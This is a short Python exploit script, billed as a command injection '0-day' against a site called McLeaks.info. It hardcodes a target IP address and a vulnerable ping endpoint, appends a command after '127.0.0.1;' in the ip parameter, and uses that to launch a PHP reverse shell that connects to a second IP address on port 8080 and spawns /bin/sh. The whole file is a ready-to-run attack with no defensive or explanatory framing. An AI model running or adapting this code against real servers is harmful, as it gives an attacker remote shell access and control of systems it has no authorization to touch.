# McLeaks.info command injection 0-day exploit
# Author: checksum (@computergoon)

import requests
import urllib.parse


# configuration
TARGET = 'http://161.35.28.206/pingPong.php'
QUERY = 'ip=%s'
COMMAND = 'php -r \'$sock=fsockopen("51.178.171.50",8080);exec("/bin/sh -i <&3 >&3 2>&3");\''


class Exploit:

    def __init__(self, url, query, command):
        self.url = url
        self.query = query
        self.command = command

    def encode(self, command):
        return urllib.parse.quote(command)

    def execute(self, encode: bool = True):
        if encode:
            self.command = self.encode(self.command)

        payload = f'127.0.0.1;{self.command}'

        return requests.get(f'{self.url}?{self.query}' % payload)


def main():
    print('\tMcLeaks.info Command Injection 0-day Exploit')
    print('\tby: checksum (@computergoon)\n')

    # initialise exploit
    exploit = Exploit(TARGET, QUERY, COMMAND)

    # execute exploit
    res = exploit.execute()

    # handle HTTP response
    if res.status_code == 200:
        print('success: command was successfully executed (200)')

    elif res.status_code == 302:
        print('error: Something is wrong with the HTTP request (302)')

    elif res.status_code == 404:
        print('error: page not found (404)')

    else:
        print(f'error: something went wrong ({res.status_code}')


if __name__ == '__main__':
    main()
